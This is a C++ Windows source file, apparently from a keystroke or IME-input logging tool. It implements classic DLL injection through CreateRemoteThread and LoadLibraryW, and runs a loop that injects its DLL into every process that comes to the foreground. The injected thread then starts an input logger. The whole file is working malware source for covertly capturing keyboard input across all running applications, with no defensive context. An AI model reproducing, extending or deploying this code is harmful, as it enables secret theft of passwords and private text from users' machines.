#include "pch.h"
#include "util.h"
#include "logger.h"
#include "imeLoggerCore.h"
#include <set>
#include <windows.h>


bool DLLinject(DWORD pid, const wchar_t* dllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		return false;
	}

	LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
	if (pDllPath == NULL)
	{
		CloseHandle(hProcess);
		return false;
	}

	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, pDllPath, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), &bytesWritten))
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
	if (hKernel32 == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	LPTHREAD_START_ROUTINE pLoadLibraryW = reinterpret_cast<LPTHREAD_START_ROUTINE>(GetProcAddress(hKernel32, "LoadLibraryW"));
	if (pLoadLibraryW == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pDllPath, 0, NULL);
	if (hThread == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return true;
}

bool IMELoggerMain() {
	IMElogger(L"IMELoggerMain Start\n");
	wchar_t dllPath[MAX_PATH];
	if (!getDLLPath(dllPath)) {
		if (DEBUG)
			DEBUGlogger(L"IMELoggerMain | Fail to get DLL path");
		return false;
	}

	
	std::set<DWORD> injectedPIDs;
	DWORD currentPID = GetCurrentProcessId();

	injectedPIDs.insert(currentPID);
	injectedPIDs.insert(GetCurrentThreadId());
	injectedPIDs.insert(0);


	wchar_t debugProcessName[] = L"WMIdorce.exe";

	while (TRUE) {
		DWORD targetPID=0; 
		DWORD threadID = GetWindowThreadProcessId(GetForegroundWindow(), &targetPID);
		if (threadID == 0 || targetPID == 0) {
			Sleep(100);
			continue;
		}
		if (injectedPIDs.find(targetPID) == injectedPIDs.end()) {
			if (DEBUG) {
				// only injection to debug process
				std::wstring processName;
				if (GetProcessNameByPID(targetPID, processName)) {
					if (_wcsicmp(processName.c_str(), debugProcessName) == 0) {
						DLLinject(targetPID, dllPath);
						injectedPIDs.insert(targetPID);
						
						DEBUGlogger(L"IMELoggerMain | Injected to DEBUG pid: ");
						DEBUGlogger(std::to_wstring(targetPID).c_str());
						DEBUGlogger(L"\n");
						
					}
				}
				continue;
			}
			// If pid not in set, inject to pid
			DLLinject(targetPID, dllPath);
			injectedPIDs.insert(targetPID);
			if (DEBUG) {
				DEBUGlogger(L"IMELoggerMain | Injected to pid: ");
				DEBUGlogger(std::to_wstring(targetPID).c_str());
				DEBUGlogger(L"\n");

			}
		}

	}

	return true;
}

bool injectProcessMain() {
	DWORD currentPID = GetCurrentProcessId();
	IMEKeyInputlogger(L"\ninjectProcessMain Start\n");
	IMEKeyInputlogger(std::to_wstring(currentPID).c_str());

	return true;
}

DWORD WINAPI injectedProcessMainThread(LPVOID lpParam)
{
	injectProcessMain();
	return true;
}